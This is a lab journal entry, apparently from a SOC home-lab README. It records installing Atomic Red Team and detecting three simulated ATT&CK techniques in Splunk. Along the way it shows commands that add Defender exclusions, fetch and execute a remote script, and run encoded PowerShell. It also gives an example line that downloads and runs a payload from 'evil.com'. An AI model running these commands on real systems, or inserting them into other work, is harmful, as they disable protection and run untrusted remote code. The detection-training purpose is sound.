<details>
<summary><b>📅 Day 3 — Atomic Red Team Installation + Attack Simulations</b></summary>

<br>

### 🎯 Objective
Install Atomic Red Team on the Windows 11 VM, simulate 3 real MITRE ATT&CK techniques, and confirm that Sysmon captures every attack event in Splunk. Today the lab transitions from passive observation to active attack simulation — the same workflow used by professional red teams and detection engineers in enterprise environments.

---

### 🧠 What is Atomic Red Team?

Atomic Red Team is a free, open-source library of attack simulations built by Red Canary — one of the world's leading managed detection and response companies. Each simulation is called an **"atomic test"** and maps directly to a specific MITRE ATT&CK technique ID.

**Key facts every SOC analyst should know:**
- Over 1,000 attack simulations covering the entire ATT&CK matrix
- Each test replicates the exact commands, tools, and behaviors real threat actors use
- Used by security teams worldwide to test whether their detection tools actually work
- Safe for lab use — simulations produce real attack artifacts (events, registry keys, network connections) without causing actual damage

**Why this matters in a SOC:**
Before Atomic Red Team, security teams had no reliable way to answer: *"If an attacker ran this technique against us right now, would our SIEM catch it?"* Atomic Red Team answers that question with real simulations instead of guesswork.

---

### 🔧 Installation Process

**Pre-installation steps performed:**

**Step 1 — Set PowerShell execution policy:**
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```
This allows PowerShell to run downloaded scripts. By default Windows blocks this as a security measure — we override it specifically for our lab environment only.

**Step 2 — Add Windows Defender exclusion for install folder:**
```powershell
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam"
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```
Atomic Red Team simulates real attack techniques — so Windows Defender correctly identifies its files as suspicious and tries to delete them. We tell Defender to ignore the `C:\AtomicRedTeam` folder and temp folders so installation completes successfully. This exclusion applies only to this specific folder — the rest of the VM remains fully protected.

**Step 3 — Install Atomic Red Team:**
```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -getAtomics -Force
```
This single command downloaded and installed:
- The Invoke-AtomicRedTeam PowerShell framework
- All atomic technique folders (T1001 through T1600+)
- All test definition files (.yaml) for each technique

**Installation result:** `C:\AtomicRedTeam\atomics` folder created containing technique folders from T1001.002 through T1600+ — each folder contains the attack simulation scripts for that specific MITRE ATT&CK technique ID.

**Step 4 — Import module before each session:**
```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```
This must be run every time a new PowerShell session starts — it loads the Invoke-AtomicTest function into memory so attack simulations can be called.

**Important note about Defender conflicts:**
During testing, Atomic Red Team Test Numbers that use external tools (Mimikatz, mshta.exe) were blocked by Windows Defender even with exclusions — because Defender has specific hardcoded protections for these notorious tools. In these cases, manual simulations were used instead to achieve the same detection outcome. This is realistic lab behavior — in real environments, EDR tools actively fight back against known attack tools.

<details>
<summary>📸 Screenshots — Installation</summary>
<br>

**Screenshot 1 — C:\AtomicRedTeam\atomics folder**
> File Explorer showing the `C:\AtomicRedTeam\atomics` folder containing all downloaded MITRE ATT&CK technique simulation folders. Each folder is named by its technique ID (T1001, T1002, T1003 etc.) and contains YAML definition files and PowerShell scripts for that specific attack technique. This confirms Atomic Red Team installed successfully with all atomics downloaded.

![Screenshot1](day%203%20screenshots/Screenshot1.png)

</details>

---

### ⚔️ Attack Simulation 1 — System Information Discovery (T1082)

**MITRE ATT&CK Technique:** T1082 — System Information Discovery
**Tactic:** Discovery
**Command run:**
```powershell
Invoke-AtomicTest T1082 -TestNumbers 1
```

**What this technique is:**
After an attacker successfully compromises a machine, the very first thing they do is reconnaissance — they need to understand the environment they've landed in. T1082 covers all the commands attackers run to gather system information: operating system version, installed patches, hardware configuration, network settings, and running processes. This information tells the attacker what vulnerabilities exist, what tools they can use, and what their next move should be.

**Real-world context:**
Every major threat actor group — from ransomware gangs to nation-state APTs — runs system discovery commands within minutes of gaining initial access. This is why detecting T1082 quickly is critical: it often represents the earliest detectable phase of an attack, before the attacker has had time to cause real damage.

**What the simulation ran on the VM:**

| Command | Purpose | What attacker learns |
|---------|---------|---------------------|
| `whoami.exe` | Identify current user and privileges | "Am I an admin? What can I do?" |
| `systeminfo` | Full OS and hardware dump | OS version, hotfixes installed, domain name, RAM, CPU |
| `cmd.exe /c systeminfo & reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum` | Chained command — system info plus disk enumeration | Storage devices attached, useful for data exfiltration planning |

**How it was detected in Splunk:**

Splunk search used:
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 earliest=-1h CommandLine="*systeminfo*" OR CommandLine="*hostname*" OR CommandLine="*whoami*"
```

**Result: 3 events detected — all 3 attack commands captured by Sysmon EventCode 1**

**What each field told us:**

| Field | Value | Significance |
|-------|-------|-------------|
| EventCode | 1 (Process Creation) | Sysmon recorded every command that ran |
| Image | `cmd.exe`, `whoami.exe` | Standard Windows tools — attacker living off the land |
| CommandLine | `whoami`, `systeminfo`, `reg query...` | Exact commands attacker ran — the evidence |
| ParentImage | `powershell.exe` | PowerShell launched these commands — common attacker pattern |
| User | `SHREYA\shreya` | Which account the attacker is using |

**Legitimate vs Malicious — how to tell the difference:**

| Indicator | Legitimate admin use | Malicious attacker use |
|-----------|---------------------|----------------------|
| Who ran it | IT administrator during maintenance | Unknown user, service account, or right after a phishing event |
| When | During scheduled maintenance window | Odd hours, weekend, immediately after a new process appeared |
| Parent process | `explorer.exe` (admin opened CMD manually) | `powershell.exe`, `wscript.exe`, `mshta.exe` (script executed it) |
| Frequency | Once or twice | Rapid succession — attacker running multiple discovery commands quickly |
| Context | Known change ticket exists | No corresponding IT activity scheduled |

**MITRE ATT&CK mapping:**
- Primary: **T1082** — System Information Discovery
- Secondary: **T1033** — System Owner/User Discovery (whoami)

<details>
<summary>📸 Screenshots — T1082 Detection</summary>
<br>

**Screenshot 2 — PowerShell showing T1082 execution complete**
> Administrator PowerShell window showing "Done executing test: T1082-1 System Information Discovery" — confirming the atomic test ran successfully. The green text confirms completion without errors. The simulation ran whoami, systeminfo, and reg query commands exactly as a real attacker would immediately after compromising a machine.

![Screenshot2](day%203%20screenshots/Screenshot2.png)

---

**Screenshot 3 — Splunk catching all 3 T1082 attack commands**
> Splunk search results showing 3 events detected for the T1082 simulation: `whoami.exe`, `systeminfo`, and `cmd.exe /c systeminfo & reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`. All three were captured by Sysmon EventCode 1 (Process Creation) with exact CommandLine values preserved — giving a SOC analyst complete forensic evidence of what the attacker ran, when, and from which parent process.

![Screenshot3](day%203%20screenshots/Screenshot3.png)

</details>

---

### ⚔️ Attack Simulation 2 — PowerShell Encoded Command Execution (T1059.001)

**MITRE ATT&CK Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell
**Tactic:** Execution
**Command run (manual simulation):**
```powershell
powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKAAnAEgAZQBsAGwAbwAgAGYAcgBvAG0AIABBAFQAVAAmAEMASwAgAFQAMQAwADUAOQAnACkA
```

**Why manual simulation was used:**
Atomic Red Team Test Numbers 1 and 8 for T1059.001 use Mimikatz and mshta.exe respectively — tools that Windows Defender blocks with hardcoded protections even when exclusions are set. A manual simulation was used instead, which achieves the identical detection outcome: Sysmon EventCode 1 captures the encoded PowerShell execution with all suspicious flags visible in the CommandLine field.

**What this technique is:**
T1059.001 is the single most commonly observed technique across all real-world cyberattacks. PowerShell is built into every Windows machine, is extremely powerful, and is trusted by the operating system — making it the perfect weapon for attackers. The `-EncodedCommand` flag specifically is used to hide malicious commands by encoding them in Base64, making them unreadable to simple signature-based detection tools that scan for keywords like "download" or "invoke."

**Real-world context:**
According to MITRE ATT&CK, T1059.001 has been used by over 100 documented threat actor groups including APT28 (Fancy Bear), APT29 (Cozy Bear), Lazarus Group, and virtually every major ransomware operation. It consistently ranks as the #1 most observed ATT&CK technique in incident response engagements globally.

**The 3 red flags in the CommandLine captured:**

```
powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBr...
```

| Flag | What it means | Why attackers use it |
|------|--------------|---------------------|
| `-ExecutionPolicy Bypass` | Overrides PowerShell's script execution restrictions | Windows blocks unsigned scripts by default — this bypasses that |
| `-EncodedCommand` | The following argument is Base64 encoded | Hides the actual malicious command from security tools scanning command lines |
| `SQBuAHYAbwBr...` (long Base64 string) | The hidden encoded payload | Security tools looking for keywords like "download" or "http" can't see them when encoded |

**What the encoded command decodes to:**
The Base64 string decodes to: `Invoke-Expression ('Hello from ATT&CK T1059')` — a harmless test message. In a real attack this would decode to something like `IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` — downloading and executing a malicious script entirely in memory without touching the disk.

**How it was detected in Splunk:**

Splunk search used:
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*powershell.exe" earliest=-5m
```

**Result: 1 event detected — encoded PowerShell execution captured perfectly by Sysmon**

**Legitimate vs Malicious — how to tell the difference:**

| Indicator | Legitimate PowerShell | Malicious encoded PowerShell |
|-----------|----------------------|------------------------------|
| `-EncodedCommand` flag | Never used in legitimate admin scripts | Almost always indicates evasion attempt |
| `-ExecutionPolicy Bypass` | Occasionally used by IT admins knowingly | Combined with EncodedCommand = high confidence malicious |
| Parent process | `explorer.exe` (admin opened it) | `winword.exe`, `excel.exe`, `wscript.exe`, `cmd.exe` |
| Time of execution | During business hours, known maintenance | Off-hours, or immediately following suspicious email open |
| Encoded string length | Short if legitimate | Very long Base64 strings indicate substantial hidden payload |

**SOC response to this alert:**
In a real SOC, this event would be classified as **Priority 1 — Immediate Investigation Required.** The analyst would:
1. Decode the Base64 string to reveal the hidden command
2. Check ParentImage to understand what launched PowerShell
3. Check network connections (EventCode 3) for any outbound connections made around the same time
4. Isolate the endpoint if the decoded command shows download or execution of remote content

**MITRE ATT&CK mapping:**
- Primary: **T1059.001** — Command and Scripting Interpreter: PowerShell
- Related: **T1027** — Obfuscated Files or Information (Base64 encoding used for evasion)

<details>
<summary>📸 Screenshots — T1059.001 Detection</summary>
<br>

**Screenshot 4 — Splunk catching encoded PowerShell execution**
> Splunk search result showing the T1059.001 detection event. The CommandLine field shows `powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBr...` — three simultaneous red flags in a single command line. This event would trigger an immediate Priority 1 alert in any real SOC environment. The combination of ExecutionPolicy Bypass + EncodedCommand is one of the highest-confidence malicious indicators in Windows endpoint detection.

![Screenshot4](day%203%20screenshots/Screenshot4.png)

</details>

---

### ⚔️ Attack Simulation 3 — Registry Run Key Persistence (T1547.001)

**MITRE ATT&CK Technique:** T1547.001 — Boot/Logon Autostart Execution: Registry Run Keys
**Tactic:** Persistence, Privilege Escalation
**Command run:**
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1
```

**What this technique is:**
After an attacker successfully compromises a machine and runs their tools, they face a critical problem: if the machine reboots or the user logs off, their access disappears. To solve this, attackers establish **persistence** — a mechanism that automatically restarts their malware every time Windows boots or a user logs in. The most common and simplest persistence technique on Windows is writing a malware path into the registry Run keys.

The Windows registry Run keys are special locations that Windows checks on every startup — anything listed there gets executed automatically. Attackers abuse this by adding their malware's file path to these keys, ensuring it runs every single time without any further action needed.

**Registry key written by the simulation:**
```
HKU\S-1-5-21-252788594-3674052656-4187746188-1001\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
```

**Breaking down what this key means:**

| Part | Meaning |
|------|---------|
| `HKU\S-1-5-21-...` | Current user's registry hive (HKU = HKEY_USERS) |
| `Software\Microsoft\Windows\CurrentVersion\Run` | The auto-start location — Windows executes everything here on login |
| `Atomic Red Team` | The name of the persistence entry (in a real attack: malware name disguised as something legitimate like "WindowsUpdate" or "AdobeHelper") |

**The 4 most critical persistence registry locations every SOC analyst must know:**

| Registry Key | Scope | Severity |
|-------------|-------|----------|
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users on machine | 🔴 Critical |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user only | 🔴 Critical |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Runs once then deletes itself | 🔴 Critical — attacker covering tracks |
| `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` | Runs at Windows login screen | 🔴 Critical |

**How it was detected in Splunk:**

Splunk search used:
```
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13 earliest=-5m
```

**Result: Registry modification event detected — persistence key written captured by Sysmon EventCode 13**

**What the event fields revealed:**

| Field | Value | Significance |
|-------|-------|-------------|
| EventCode | 13 (Registry Value Set) | Sysmon caught a registry write operation |
| TargetObject | `HKU\...\CurrentVersion\Run\Atomic Red Team` | The exact persistence key written — smoking gun evidence |
| Details | Path to executable being persisted | What malware will run on next login |
| Image | `powershell.exe` | PowerShell wrote the registry key — common attacker method |
| User | `SHREYA\shreya` | Which account established persistence |

**Legitimate vs Malicious — how to tell the difference:**

| Indicator | Legitimate software | Malicious persistence |
|-----------|--------------------|-----------------------|
| Who writes to Run key | Known software installers (Zoom, Teams, Adobe) | Unknown process, PowerShell, cmd.exe |
| Entry name | Recognizable software name | Random string, disguised as Windows process |
| Path of executable | `C:\Program Files\...` (standard install path) | `C:\Users\Public\`, `C:\Temp\`, `C:\Windows\Temp\` |
| Time of modification | During software installation | Odd hours, or immediately after suspicious activity |
| Corresponding software | Installed application visible in Add/Remove Programs | No corresponding installed software found |

**Why this detection is so valuable in a real SOC:**
Persistence mechanisms are what turn a temporary compromise into a long-term breach. An attacker without persistence loses access the moment the machine reboots. An attacker with persistence has ongoing access for weeks or months. Detecting T1547.001 at the moment the registry key is written — before the first reboot — means you catch the attacker before they've had time to move laterally, steal data, or deploy ransomware.

**MITRE ATT&CK mapping:**
- Primary: **T1547.001** — Boot/Logon Autostart Execution: Registry Run Keys / Startup Folder
- Tactic: **Persistence** + **Privilege Escalation**

<details>
<summary>📸 Screenshots — T1547.001 Detection</summary>
<br>

**Screenshot 5 — PowerShell showing T1547.001 execution complete**
> Administrator PowerShell window showing "Done executing test: T1547.001" — confirming the persistence simulation ran successfully without Defender interference (registry writes are not blocked by Defender, unlike executable tools). This is significant: registry-based persistence is one of the hardest techniques to prevent because Windows itself needs to write to these keys for legitimate software.

![Screenshot5](day%203%20screenshots/Screenshot5.png)

---

**Screenshot 6 — Splunk catching registry persistence key**
> Splunk search showing EventCode 13 (Registry Value Set) with TargetObject field displaying `HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team` — the exact auto-start persistence key written by the simulation. This is one of the highest-value detections in Windows security: catching the moment an attacker establishes persistence means you can respond before the malware has had a chance to execute even once on reboot.

![Screenshot6](day%203%20screenshots/Screenshot6.png)

</details>

---

### 📊 Day 3 Attack Simulation Summary

| Technique ID | Technique Name | Tactic | Sysmon Event | Detection Status |
|-------------|---------------|--------|--------------|-----------------|
| T1082 | System Information Discovery | Discovery | EventCode 1 — whoami, systeminfo, reg query commands captured | ✅ Detected |
| T1059.001 | PowerShell Encoded Command | Execution | EventCode 1 — EncodedCommand + ExecutionPolicy Bypass flags captured | ✅ Detected |
| T1547.001 | Registry Run Key Persistence | Persistence | EventCode 13 — CurrentVersion\Run key write captured | ✅ Detected |

---

### 🔑 Key Lesson from Day 3

**The attacker kill chain we simulated today follows a realistic attack sequence:**

```
T1082 (Discovery)  →  T1059.001 (Execution)  →  T1547.001 (Persistence)
"What am I in?"       "Run my payload"           "Make sure I survive reboots"
```

This is exactly the sequence seen in real ransomware and APT intrusions — reconnaissance first, execution second, persistence third. By detecting each stage independently in Splunk using Sysmon EventCode 1 and EventCode 13, a SOC analyst can catch the attack at multiple points in the kill chain — not just at the end when damage is already done.

**What changes in Day 4:**
Today we found these events by manually searching Splunk after we knew an attack had run. In Day 4 we write **automated SPL detection rules and Splunk Alerts** that will fire automatically the moment any of these patterns appear — without any human needing to manually search. That's how real SOC detection engineering works.

</details>
